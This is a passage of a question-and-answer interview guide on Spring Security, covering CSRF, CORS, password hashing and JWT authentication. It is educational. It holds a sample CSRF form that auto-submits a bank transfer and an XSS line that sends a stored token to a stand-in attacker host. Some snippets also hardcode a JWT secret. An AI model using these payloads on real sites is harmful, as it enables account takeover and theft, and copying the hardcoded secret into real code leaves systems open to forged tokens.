**A :** 

**CSRF (Cross-Site Request Forgery)** is an attack where a malicious site tricks an authenticated user into performing unwanted actions on a trusted site.

**Attack scenario :**

1. **Victim** logs into `bank.com` → Active session (JSESSIONID cookie)
2. **Victim** visits `malicious.com` (in another tab)
3. `malicious.com` contains a hidden form :
```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="hacker-account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```
4. The browser automatically sends the JSESSIONID cookie with the request
5. `bank.com` thinks it is a legitimate request from the user
6. **Result :** Transfer of $10,000 to the hacker's account

**CSRF protection in Spring Security :**
Spring generates a unique **CSRF token** per session that must be included in all mutating requests (POST, PUT, DELETE).

---

**Q13 : How to implement CSRF protection in a web application ?**

**A :** 

**Configuration (enabled by default) :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(Customizer.withDefaults()) // Enabled by default
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
        .formLogin(Customizer.withDefaults());
    
    return http.build();
}
```

**In HTML forms (Thymeleaf) :**
```html
<form method="POST" th:action="@{/api/users}">
    <!-- Thymeleaf automatically adds the token -->
    <input type="text" name="name">
    <button type="submit">Create User</button>
</form>

<!-- Or manually -->
<form method="POST" action="/api/users">
    <input type="text" name="name">
    <input type="hidden" 
           th:name="${_csrf.parameterName}" 
           th:value="${_csrf.token}"/>
    <button type="submit">Create User</button>
</form>
```

**With AJAX/JavaScript :**
```html
<meta name="_csrf" th:content="${_csrf.token}"/>
<meta name="_csrf_header" th:content="${_csrf.headerName}"/>

<script>
const token = document.querySelector('meta[name="_csrf"]').content;
const header = document.querySelector('meta[name="_csrf_header"]').content;

fetch('/api/users', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        [header]: token // X-CSRF-TOKEN: abc123
    },
    body: JSON.stringify({ name: 'John' })
});
</script>
```

---

**Q14 : When should CSRF protection be disabled ?**

**A :** 

**Disable CSRF for :**
- ✅ **Stateless REST APIs** (JWT, Basic Auth without session)
- ✅ **APIs consumed by non-browser applications** (mobile apps, scripts)
- ✅ **Internal microservices** (server-to-server communication)

**Keep CSRF enabled for :**
- ❌ **Web applications with sessions** (Form login)
- ❌ **APIs with cookie-based authentication**
- ❌ **Applications accessible from a browser**

**Configuration for REST API :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.disable()) // Disable for REST API
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        )
        .httpBasic(Customizer.withDefaults());
    
    return http.build();
}
```

**Simple rule :** If your API is **stateless** (no session cookies), disable CSRF.

---

### **Questions on CORS**

**Q15 : What is CORS and why do we need it ?**

**A :** 

**CORS (Cross-Origin Resource Sharing)** is a browser security mechanism that **blocks AJAX requests** to a different domain from the one that served the page.

**Same-Origin Policy (problem) :**
```
Frontend:  http://localhost:3000 (React)
Backend:   http://localhost:8080 (Spring Boot)
→ Different origins → ❌ Request blocked by the browser
```

**Even if :**
- Same machine
- Different ports = Different origins

**CORS (solution) :**
The server (Spring Boot) sends headers authorizing certain origins to access resources.

---

**Q16 : How to configure CORS in Spring Security ?**

**A :** 

**Option 1 : Global configuration (recommended) :**
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
        
        return http.build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // Allowed origins
        configuration.setAllowedOrigins(Arrays.asList(
            "http://localhost:3000",
            "https://myapp.com"
        ));
        
        // Or allow all (⚠️ dev only)
        // configuration.setAllowedOrigins(Arrays.asList("*"));
        
        // Allowed HTTP methods
        configuration.setAllowedMethods(Arrays.asList(
            "GET", "POST", "PUT", "DELETE", "OPTIONS"
        ));
        
        // Allowed headers
        configuration.setAllowedHeaders(Arrays.asList("*"));
        
        // Allow sending credentials (cookies, Authorization header)
        configuration.setAllowCredentials(true);
        
        // Cache duration for preflight request
        configuration.setMaxAge(3600L);
        
        // Headers exposed to the client
        configuration.setExposedHeaders(Arrays.asList("Authorization"));
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

**Option 2 : @CrossOrigin annotation (for specific endpoints) :**
```java
@RestController
@RequestMapping("/api/users")
@CrossOrigin(origins = "http://localhost:3000")
public class UserController {
    
    @GetMapping
    public List<User> getUsers() {
        return userService.findAll();
    }
    
    @PostMapping
    @CrossOrigin(origins = {"http://localhost:3000", "https://myapp.com"})
    public User createUser(@RequestBody User user) {
        return userService.save(user);
    }
}
```

**Option 3 : WebMvcConfigurer (alternative) :**
```java
@Configuration
public class WebConfig implements WebMvcConfigurer {
    
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("http://localhost:3000")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("*")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

---

**Q17 : What is a Preflight Request in CORS ?**

**A :** 

For certain requests (POST/PUT/DELETE with custom headers), the browser first sends a **preflight request** (OPTIONS) to check if the server allows the actual request.

**Flow :**
```
1. Browser → OPTIONS /api/users (preflight)
   Headers:
   - Origin: http://localhost:3000
   - Access-Control-Request-Method: POST
   - Access-Control-Request-Headers: Content-Type, Authorization

2. Server → Response 200 OK
   Headers:
   - Access-Control-Allow-Origin: http://localhost:3000
   - Access-Control-Allow-Methods: POST
   - Access-Control-Allow-Headers: Content-Type, Authorization
   - Access-Control-Max-Age: 3600

3. Browser → POST /api/users (actual request)
```

**MaxAge = 3600** : The browser caches the preflight response for 1h (avoids re-sending OPTIONS on every request).

---

### **Questions on User Storage**

**Q18 : What are the different ways to store users in Spring Security ?**

**A :** 

**1. In-Memory (dev/test only) :**
```java
@Bean
public UserDetailsService userDetailsService() {
    UserDetails user = User.builder()
        .username("john")
        .password(passwordEncoder().encode("password123"))
        .roles("USER")
        .build();
    
    UserDetails admin = User.builder()
        .username("admin")
        .password(passwordEncoder().encode("admin123"))
        .roles("ADMIN", "USER")
        .build();
    
    return new InMemoryUserDetailsManager(user, admin);
}
```

**2. JDBC (database with Spring Security tables) :**
```java
@Bean
public UserDetailsService userDetailsService(DataSource dataSource) {
    return new JdbcUserDetailsManager(dataSource);
}
```

Standard SQL tables :
```sql
CREATE TABLE users (
    username VARCHAR(50) PRIMARY KEY,
    password VARCHAR(100) NOT NULL,
    enabled BOOLEAN NOT NULL
);

CREATE TABLE authorities (
    username VARCHAR(50) NOT NULL,
    authority VARCHAR(50) NOT NULL,
    FOREIGN KEY (username) REFERENCES users(username)
);
```

**3. Custom UserDetailsService (recommended in production) :**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) 
            throws UsernameNotFoundException {
        
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found: " + username));
        
        return org.springframework.security.core.userdetails.User.builder()
            .username(user.getUsername())
            .password(user.getPassword())
            .roles(user.getRoles().toArray(new String[0]))
            .accountExpired(!user.isAccountNonExpired())
            .accountLocked(!user.isAccountNonLocked())
            .credentialsExpired(!user.isCredentialsNonExpired())
            .disabled(!user.isEnabled())
            .build();
    }
}
```

**My recommendation :** Custom UserDetailsService for full flexibility.

---

**Q19 : How to implement a complete Custom UserDetailsService ?**

**A :** 

**User Entity :**
```java
@Entity
@Table(name = "users")
@Data
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column(unique = true, nullable = false)
    private String username;
    
    @Column(nullable = false)
    private String password;
    
    private String email;
    
    @ElementCollection(fetch = FetchType.EAGER)
    @CollectionTable(name = "user_roles", joinColumns = @JoinColumn(name = "user_id"))
    @Column(name = "role")
    private Set<String> roles = new HashSet<>();
    
    private boolean enabled = true;
    private boolean accountNonExpired = true;
    private boolean accountNonLocked = true;
    private boolean credentialsNonExpired = true;
}
```

**Repository :**
```java
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsername(String username);
}
```

**UserDetailsService :**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) 
            throws UsernameNotFoundException {
        
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found: " + username));
        
        List<GrantedAuthority> authorities = user.getRoles().stream()
            .map(role -> new SimpleGrantedAuthority("ROLE_" + role))
            .collect(Collectors.toList());
        
        return new org.springframework.security.core.userdetails.User(
            user.getUsername(),
            user.getPassword(),
            user.isEnabled(),
            user.isAccountNonExpired(),
            user.isCredentialsNonExpired(),
            user.isAccountNonLocked(),
            authorities
        );
    }
}
```

**Security Configuration :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Autowired
    private CustomUserDetailsService userDetailsService;
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .userDetailsService(userDetailsService) // Use our custom service
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**").permitAll()
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults());
        
        return http.build();
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

---

### **Questions on Password Encoding**

**Q20 : What is the difference between Encoding, Hashing and Encryption ?**

**A :** 

| Concept | Reversible ? | Key needed ? | Usage | Example |
|---------|-------------|------------------|-------|---------|
| **Encoding** | ✅ Yes | ❌ No | Data representation | Base64, URL encoding |
| **Hashing** | ❌ No (one-way) | ❌ No | Passwords, integrity | BCrypt, SHA-256 |
| **Encryption** | ✅ Yes | ✅ Yes | Confidentiality | AES, RSA |

**Encoding (Base64) :**
```java
String original = "password123";
String encoded = Base64.getEncoder().encodeToString(original.getBytes());
// cGFzc3dvcmQxMjM=

String decoded = new String(Base64.getDecoder().decode(encoded));
// password123

// ⚠️ Easily reversible → NEVER use for passwords !
```

**Hashing (BCrypt) - FOR PASSWORDS :**
```java
PasswordEncoder encoder = new BCryptPasswordEncoder();

String rawPassword = "password123";
String hashedPassword = encoder.encode(rawPassword);
// $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

// Impossible to recover "password123" from the hash

// Verification
boolean matches = encoder.matches("password123", hashedPassword);
// true
```

**Encryption (AES) - FOR SENSITIVE NON-PASSWORD DATA :**
```java
// For data that needs to be decrypted later
// (credit card numbers, SSN, etc.)
// ⚠️ NEVER use for passwords !
```

---

**Q21 : Why use BCrypt instead of SHA-256 for passwords ?**

**A :** 

**SHA-256 (bad for passwords) :**
```java
String password = "password123";
String hash = DigestUtils.sha256Hex(password);
// ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f

// ❌ Problems :
// 1. Same password → Always same hash (no salt)
// 2. Very fast → Vulnerable to brute-force
// 3. Rainbow tables available
```

**BCrypt (good for passwords) :**
```java
PasswordEncoder encoder = new BCryptPasswordEncoder();

String password = "password123";
String hash1 = encoder.encode(password);
// $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

String hash2 = encoder.encode(password);
// $2a$10$DifferentHashEvenForSamePassword...

// ✅ Advantages :
// 1. Automatic random salt → Each hash is unique
// 2. Configurable strength → Slows down brute-force
// 3. One-way → Impossible to decode
// 4. Resistant to rainbow tables
```

**BCrypt hash structure :**
```
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
 │   │  │                                │
 │   │  └─ Salt (22 chars)              └─ Hash (31 chars)
 │   └─ Cost factor (2^10 = 1024 rounds)
 └─ Algorithm version
```

---

**Q22 : How to configure the BCrypt strength ?**

**A :** 

```java
@Bean
public PasswordEncoder passwordEncoder() {
    // Strength = number of rounds = 2^strength
    return new BCryptPasswordEncoder(12); // 2^12 = 4096 rounds
}
```

**Recommended values :**
- **10** (default) : ~100ms to hash → Good balance
- **12** : ~400ms → More secure, acceptable
- **14** : ~1.6s → Very secure but slow
- **4** : ~1ms → ⚠️ Too fast, vulnerable

**Rule :** Choose a value that takes **100-500ms** on your server. This sufficiently slows down brute-force without impacting UX.

**Performance test :**
```java
public class BCryptBenchmark {
    public static void main(String[] args) {
        for (int strength = 10; strength <= 14; strength++) {
            PasswordEncoder encoder = new BCryptPasswordEncoder(strength);
            
            long start = System.currentTimeMillis();
            encoder.encode("password123");
            long duration = System.currentTimeMillis() - start;
            
            System.out.println("Strength " + strength + ": " + duration + "ms");
        }
    }
}

// Example output :
// Strength 10: 89ms
// Strength 11: 176ms
// Strength 12: 352ms
// Strength 13: 704ms
// Strength 14: 1408ms
```

**Trade-off :** The higher the strength, the more secure, but the slower the login.

---

### **Questions on JWT (JSON Web Token)**

**Q23 : What is JWT and why use it ?**

**A :** 

**JWT (JSON Web Token)** is a standard (RFC 7519) for creating **compact and self-contained access tokens** for stateless REST APIs.

**Advantages :**
- ✅ **Stateless** : Server stores nothing, all info is in the token
- ✅ **Scalable** : No shared session between servers
- ✅ **Cross-domain** : Works across different domains
- ✅ **Mobile-friendly** : No cookies, just a header
- ✅ **Microservices-ready** : Each service can validate independently

**Use cases :**
- Stateless REST APIs
- Single Page Applications (React, Angular, Vue)
- Mobile applications
- Microservices architecture

---

**Q24 : What is the structure of a JWT ?**

**A :** 

JWT consists of **3 parts** separated by dots :

```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqb2huIiwicm9sZXMiOlsiVVNFUiJdLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**1. Header (Algorithm & Token Type) :**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Encoded in Base64URL : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

**2. Payload (Claims - User data) :**
```json
{
  "sub": "john",              // Subject (username)
  "roles": ["USER", "ADMIN"],
  "iat": 1516239022,          // Issued At (timestamp)
  "exp": 1516242622           // Expiration (timestamp)
}
```
Encoded in Base64URL : `eyJzdWIiOiJqb2huIiwi...`

**3. Signature (Guarantees integrity) :**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

**Important :** 
- ⚠️ Header and Payload are **encoded** (Base64), not encrypted → Readable by anyone
- ✅ The **signature** guarantees the token has not been modified
- ❌ NEVER put sensitive data (password, SSN) in the payload

---

**Q25 : What is the difference between JWT and Session-based authentication ?**

**A :** 

| Aspect | Session-based | JWT |
|--------|---------------|-----|
| **Storage** | Server (memory/Redis) | Client (localStorage/header) |
| **State** | Stateful | Stateless |
| **Scalability** | Difficult (shared session) | Easy (no session) |
| **Invalidation** | Easy (delete session) | Difficult (wait for expiration) |
| **Security** | HttpOnly cookie | Depends on client storage |
| **Performance** | DB lookup on every request | Local validation (signature) |
| **Mobile/SPA** | Difficult (cookies) | Easy (header) |

**Session-based flow :**
```
1. Login → Server creates session → Returns JSESSIONID cookie
2. Client sends cookie automatically
3. Server looks up session in DB/Redis
4. Logout → Server deletes session
```

**JWT flow :**
```
1. Login → Server generates JWT → Returns token
2. Client stores token (localStorage)
3. Client sends token in header Authorization: Bearer <token>
4. Server validates token signature (no DB lookup)
5. Client-side logout only (delete token)
```

---

**Q26 : How to implement JWT authentication in Spring Boot ?**

**A :** 

**Complete structure :**
```
JwtUtil → Generates/validates tokens
JwtAuthenticationFilter → Intercepts requests and validates JWT
SecurityConfig → Configures Spring Security
AuthController → Login endpoint
```

**JwtUtil (generation and validation) :**
```java
@Component
public class JwtUtil {
    
    @Value("${jwt.secret}")
    private String secret;
    
    @Value("${jwt.expiration}")
    private Long expiration; // 86400000 = 24h in milliseconds
    
    private Key getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secret);
        return Keys.hmacShaKeyFor(keyBytes);
    }
    
    public String generateToken(String username, List<String> roles) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("roles", roles);
        
        return Jwts.builder()
            .setClaims(claims)
            .setSubject(username)
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(getSigningKey(), SignatureAlgorithm.HS256)
            .compact();
    }
    
    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }
    
    public Date extractExpiration(String token) {
        return extractClaim(token, Claims::getExpiration);
    }
    
    public List<String> extractRoles(String token) {
        Claims claims = extractAllClaims(token);
        return (List<String>) claims.get("roles");
    }
    
    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
        final Claims claims = extractAllClaims(token);
        return claimsResolver.apply(claims);
    }
    
    private Claims extractAllClaims(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(getSigningKey())
            .build()
            .parseClaimsJws(token)
            .getBody();
    }
    
    private Boolean isTokenExpired(String token) {
        return extractExpiration(token).before(new Date());
    }
    
    public Boolean validateToken(String token, UserDetails userDetails) {
        final String username = extractUsername(token);
        return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
    }
}
```

**application.properties :**
```properties
# JWT Secret (256+ bits for HS256)
jwt.secret=myVerySecureSecretKeyForJwtTokenGenerationWithAtLeast256BitsForHS256Algorithm
jwt.expiration=86400000
```

---

**Q27 : How does the JwtAuthenticationFilter work ?**

**A :** 

The **JwtAuthenticationFilter** intercepts every HTTP request to extract and validate the JWT.

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                    HttpServletResponse response, 
                                    FilterChain filterChain) 
            throws ServletException, IOException {
        
        // 1. Extract the Authorization header
        final String authHeader = request.getHeader("Authorization");
        
        // 2. Check "Bearer <token>" format
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response);
            return;
        }
        
        try {
            // 3. Extract the token (remove "Bearer ")
            final String jwt = authHeader.substring(7);
            
            // 4. Extract username from token
            final String username = jwtUtil.extractUsername(jwt);
            
            // 5. If valid username and not already authenticated
            if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
                
                // 6. Load UserDetails from DB
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                
                // 7. Validate the token (signature + expiration)
                if (jwtUtil.validateToken(jwt, userDetails)) {
                    
                    // 8. Create Authentication object
                    UsernamePasswordAuthenticationToken authToken = 
                        new UsernamePasswordAuthenticationToken(
                            userDetails,
                            null,
                            userDetails.getAuthorities()
                        );
                    
                    authToken.setDetails(
                        new WebAuthenticationDetailsSource().buildDetails(request)
                    );
                    
                    // 9. Store in SecurityContext
                    SecurityContextHolder.getContext().setAuthentication(authToken);
                }
            }
        } catch (ExpiredJwtException e) {
            logger.error("JWT token expired: {}", e.getMessage());
            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
            response.getWriter().write("{\"error\":\"Token expired\"}");
            return;
        } catch (Exception e) {
            logger.error("Cannot set user authentication: {}", e.getMessage());
        }
        
        // 10. Continue the filter chain
        filterChain.doFilter(request, response);
    }
}
```

**Detailed flow :**
```
1. Client → GET /api/users
   Header: Authorization: Bearer eyJhbGc...
   
2. JwtAuthenticationFilter → Intercepts
   
3. Extract JWT from header
   
4. Parse JWT → Extract username="john"
   
5. Load UserDetails from DB (via UserDetailsService)
   
6. Validate JWT:
   - Correct signature ?
   - Valid expiration ?
   - Username match ?
   
7. If valid → Create Authentication object
   
8. Store in SecurityContext
   
9. Continue to Controller
```

---

**Q28 : How to integrate JwtAuthenticationFilter into Spring Security ?**

**A :** 

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Autowired
    private JwtAuthenticationFilter jwtAuthFilter;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS) // No session
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**", "/public/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            // Add JWT filter BEFORE UsernamePasswordAuthenticationFilter
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
    
    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) 
            throws Exception {
        return config.getAuthenticationManager();
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

**Why `.addFilterBefore()` ?**
- JWT filter must run **before** the standard authentication filter
- If JWT is valid → User is authenticated before reaching other filters
- If JWT is invalid → Request is blocked

---

**Q29 : How to implement the /auth/login endpoint with JWT ?**

**A :** 

```java
@RestController
@RequestMapping("/auth")
public class AuthController {
    
    @Autowired
    private AuthenticationManager authenticationManager;
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @PostMapping("/login")
    public ResponseEntity<?> login(@Valid @RequestBody LoginRequest request) {
        try {
            // 1. Authenticate with AuthenticationManager
            Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                    request.getUsername(),
                    request.getPassword()
                )
            );
            
            // 2. Load UserDetails
            UserDetails userDetails = userDetailsService.loadUserByUsername(request.getUsername());
            
            // 3. Extract roles
            List<String> roles = userDetails.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .map(role -> role.replace("ROLE_", ""))
                .collect(Collectors.toList());
            
            // 4. Generate JWT
            String jwt = jwtUtil.generateToken(userDetails.getUsername(), roles);
            
            // 5. Return token
            return ResponseEntity.ok(new AuthResponse(
                jwt,
                userDetails.getUsername(),
                roles
            ));
            
        } catch (BadCredentialsException e) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(new ErrorResponse("Invalid username or password"));
        }
    }
    
    @PostMapping("/register")
    public ResponseEntity<?> register(@Valid @RequestBody RegisterRequest request) {
        // Check if username already exists
        if (userRepository.existsByUsername(request.getUsername())) {
            return ResponseEntity.badRequest()
                .body(new ErrorResponse("Username already taken"));
        }
        
        // Create new user
        User user = new User();
        user.setUsername(request.getUsername());
        user.setEmail(request.getEmail());
        user.setPassword(passwordEncoder.encode(request.getPassword()));
        user.setRoles(Set.of("USER"));
        
        userRepository.save(user);
        
        return ResponseEntity.ok(new MessageResponse("User registered successfully"));
    }
}

// DTOs
@Data
class LoginRequest {
    @NotBlank
    private String username;
    
    @NotBlank
    private String password;
}

@Data
@AllArgsConstructor
class AuthResponse {
    private String token;
    private String username;
    private List<String> roles;
}

@Data
class RegisterRequest {
    @NotBlank
    @Size(min = 3, max = 20)
    private String username;
    
    @NotBlank
    @Email
    private String email;
    
    @NotBlank
    @Size(min = 6, max = 40)
    private String password;
}

@Data
@AllArgsConstructor
class ErrorResponse {
    private String message;
}

@Data
@AllArgsConstructor
class MessageResponse {
    private String message;
}
```

---

**Q30 : How to use JWT on the client side (React/JavaScript) ?**

**A :** 

**Login and token storage :**
```javascript
// Login
async function login(username, password) {
    const response = await fetch('http://localhost:8080/auth/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    });
    
    if (response.ok) {
        const data = await response.json();
        
        // Store the token
        localStorage.setItem('token', data.token);
        localStorage.setItem('username', data.username);
        localStorage.setItem('roles', JSON.stringify(data.roles));
        
        console.log('Login successful');
    } else {
        console.error('Login failed');
    }
}

// Protected request
async function getUsers() {
    const token = localStorage.getItem('token');
    
    const response = await fetch('http://localhost:8080/api/users', {
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        }
    });
    
    if (response.ok) {
        const users = await response.json();
        console.log(users);
    } else if (response.status === 401) {
        console.error('Token expired or invalid');
        // Redirect to login
        window.location.href = '/login';
    }
}

// Logout
function logout() {
    localStorage.removeItem('token');
    localStorage.removeItem('username');
    localStorage.removeItem('roles');
    window.location.href = '/login';
}

// Axios Interceptor (alternative)
import axios from 'axios';

const api = axios.create({
    baseURL: 'http://localhost:8080'
});

// Automatically add token
api.interceptors.request.use(
    config => {
        const token = localStorage.getItem('token');
        if (token) {
            config.headers['Authorization'] = `Bearer ${token}`;
        }
        return config;
    },
    error => Promise.reject(error)
);

// Handle token expiration
api.interceptors.response.use(
    response => response,
    error => {
        if (error.response && error.response.status === 401) {
            localStorage.clear();
            window.location.href = '/login';
        }
        return Promise.reject(error);
    }
);

// Usage
api.get('/api/users').then(response => console.log(response.data));
```

---

**Q31 : What are the security risks with JWT and how to mitigate them ?**

**A :** 

**Risks and solutions :**

**1. XSS (Cross-Site Scripting) :**
- **Risk :** If token is in localStorage, a malicious script can steal it
```javascript
// Malicious XSS script
<script>
    fetch('https://hacker.com/steal?token=' + localStorage.getItem('token'));
</script>
```
- **Solution :**
  - Sanitize all user inputs
  - Use Content Security Policy (CSP)
  - Store token in HttpOnly cookie (if possible)

**2. Token Theft :**
- **Risk :** Intercepted token → Attacker can use it until expiration
- **Solution :**
  - Short expiration (15min - 1h)
  - Refresh tokens to extend session
  - HTTPS required
  - Token rotation

**3. JWT Size :**
- **Risk :** JWT can get large with many claims
- **Solution :**
  - Store only essential data (user ID, roles)
  - Do not store full objects

**4. Weak Secret Key :**
- **Risk :** Weak key → Attacker can forge tokens
- **Solution :**
  - Key 256+ bits for HS256
  - Store in environment variables, not in code
```properties
# ✅ Good
jwt.secret=${JWT_SECRET}

# ❌ Bad
jwt.secret=mysecret
```

**5. No Revocation :**
- **Risk :** Impossible to invalidate a token before expiration
- **Solution :**
  - Token blacklist (Redis)
  - Short expiration + Refresh tokens
```java
@Service
public class TokenBlacklistService {
    
    @Autowired
    private RedisTemplate<String, String> redisTemplate;
    
    public void blacklistToken(String token, long expiration) {
        redisTemplate.opsForValue().set(
            "blacklist:" + token,
            "true",
            expiration,
            TimeUnit.MILLISECONDS
        );
    }
    
    public boolean isBlacklisted(String token) {
        return Boolean.TRUE.equals(
            redisTemplate.hasKey("blacklist:" + token)
        );
    }
}
```

---

**Q32 : How to implement Refresh Tokens with JWT ?**

**A :** 

**Concept :**
- **Access Token** : Short-lived (15min), used for requests
- **Refresh Token** : Long-lived (7 days), used only to get a new Access Token

**Flow :**
```
1. Login → Server generates Access Token (15min) + Refresh Token (7 days)
2. Client uses Access Token for requests
3. Access Token expires → Client sends Refresh Token to /auth/refresh
4. Server validates Refresh Token → Generates new Access Token
5. Repeat...
```

**Implementation :**
```java
@RestController
@RequestMapping("/auth")
public class AuthController {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private RefreshTokenService refreshTokenService;
    
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request) {
        // Authenticate...
        
        // Generate Access Token (15min)
        String accessToken = jwtUtil.generateToken(username, roles, 900000L); // 15min
        
        // Generate Refresh Token (7 days)
        RefreshToken refreshToken = refreshTokenService.createRefreshToken(username);
        
        return ResponseEntity.ok(new AuthResponse(
            accessToken,
            refreshToken.getToken(),
            username,
            roles
        ));
    }
    
    @PostMapping("/refresh")
    public ResponseEntity<?> refreshToken(@RequestBody RefreshTokenRequest request) {
        String requestRefreshToken = request.getRefreshToken();
        
        return refreshTokenService.findByToken(requestRefreshToken)
            .map(refreshTokenService::verifyExpiration)
            .map(RefreshToken::getUser)
            .map(user -> {
                String newAccessToken = jwtUtil.generateToken(
                    user.getUsername(),
                    user.getRoles(),
                    900000L
                );
                return ResponseEntity.ok(new RefreshTokenResponse(newAccessToken));
            })
            .orElseThrow(() -> new TokenRefreshException("Refresh token not found or expired"));
    }
    
    @PostMapping("/logout")
    public ResponseEntity<?> logout(@RequestBody LogoutRequest request) {
        refreshTokenService.deleteByToken(request.getRefreshToken());
        return ResponseEntity.ok(new MessageResponse("Logout successful"));
    }
}

// Refresh Token Entity
@Entity
@Data
public class RefreshToken {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @ManyToOne
    @JoinColumn(name = "user_id")
    private User user;
    
    @Column(unique = true, nullable = false)
    private String token;
    
    @Column(nullable = false)
    private Instant expiryDate;
}

// Refresh Token Service
@Service
public class RefreshTokenService {
    
    @Value("${jwt.refreshExpiration}")
    private Long refreshTokenDuration; // 604800000 = 7 days
    
    @Autowired
    private RefreshTokenRepository refreshTokenRepository;
    
    @Autowired
    private UserRepository userRepository;
    
    public RefreshToken createRefreshToken(String username) {
        User user = userRepository.findByUsername(username).orElseThrow();
        
        RefreshToken refreshToken = new RefreshToken();
        refreshToken.setUser(user);
        refreshToken.setToken(UUID.randomUUID().toString());
        refreshToken.setExpiryDate(Instant.now().plusMillis(refreshTokenDuration));
        
        return refreshTokenRepository.save(refreshToken);
    }
    
    public Optional<RefreshToken> findByToken(String token) {
        return refreshTokenRepository.findByToken(token);
    }
    
    public RefreshToken verifyExpiration(RefreshToken token) {
        if (token.getExpiryDate().compareTo(Instant.now()) < 0) {
            refreshTokenRepository.delete(token);
            throw new TokenRefreshException("Refresh token expired");
        }
        return token;
    }
